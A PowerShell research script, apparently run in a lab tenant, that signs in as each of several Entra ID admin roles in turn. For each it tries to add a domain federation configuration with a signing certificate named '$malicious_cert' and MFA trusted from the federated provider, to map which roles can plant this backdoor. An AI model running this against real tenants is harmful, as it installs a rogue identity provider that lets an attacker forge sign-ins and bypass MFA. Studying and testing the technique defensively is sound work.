# Use PowerShell 7 to get better error management
Import-Module AADInternals

. .\config.ps1

$roles = @("globalAdmin", "securityAdmin", "hybridIdentityAdmin", "externalIdentityProviderAdmin", "domainNameAdmin", "partnerTier1Support", "partnerTier2Support")
# $roles = @("partnerTier2Support")

foreach ($role in $roles) {
    Write-Host "---------------------- $role"
    $fqdn = "$role.$custom_domain_suffix"
    
    # first, use Global Admin account to delete any federation config
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials["globalAdmin"].login, (ConvertTo-SecureString -String $credentials["globalAdmin"].password -AsPlainText -Force)

    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    $atg_secure = ConvertTo-SecureString $atg -AsPlainText -Force
    Connect-MgGraph -AccessToken $atg_secure | Out-Null

    # delete any federation config
    1..2 | ForEach-Object { # seems to be necessary sometimes...
        $configs = $null
        $configs = Get-MgDomainFederationConfiguration -DomainId $fqdn -ErrorAction SilentlyContinue
        if ($configs) {
            Remove-MgDomainFederationConfiguration -DomainId $fqdn -InternalDomainFederationId $configs.Id
            Start-Sleep 5
        }
    }

    # wait until the federation config removal is taken into account
    do {
        try {
            $foundconf = $null
            $foundconf = Get-MgDomainFederationConfiguration -DomainId $fqdn -InternalDomainFederationId $configs.Id -ErrorAction Stop
        }
        catch {
            Start-Sleep 2
        }
    } until ($null -eq $foundconf)
    # just in case
    Start-Sleep 5

    # now log as target role and try adding federation

    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials[$role].login, (ConvertTo-SecureString -String $credentials[$role].password -AsPlainText -Force)
    
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    $atg_secure = ConvertTo-SecureString $atg -AsPlainText -Force
    Connect-MgGraph -AccessToken $atg_secure | Out-Null
    
    try {
        $newconf = New-MgDomainFederationConfiguration `
            -DomainId $fqdn `
            -ActiveSignInUri "https://example.com/something" `
            -IssuerUri "https://$fqdn/$('{0:X}' -f (Get-Date).GetHashCode())" `
            -MetadataExchangeUri "https://example.net/something" `
            -PassiveSignInUri "https://example.net/something" `
            -SignOutUri "https://example.net/something" `
            -DisplayName "some example" `
            -FederatedIdpMfaBehavior "acceptIfMfaDoneByFederatedIdp" `
            -SigningCertificate $malicious_cert `
            -ErrorAction Stop
        
        if ($null -ne $newconf) {
            Write-Host "It worked! New conf:"
            $newconf | Out-String
        }
    }
    catch {
        Write-Host "[!] New-MgDomainFederationConfiguration: $_"
    }
}
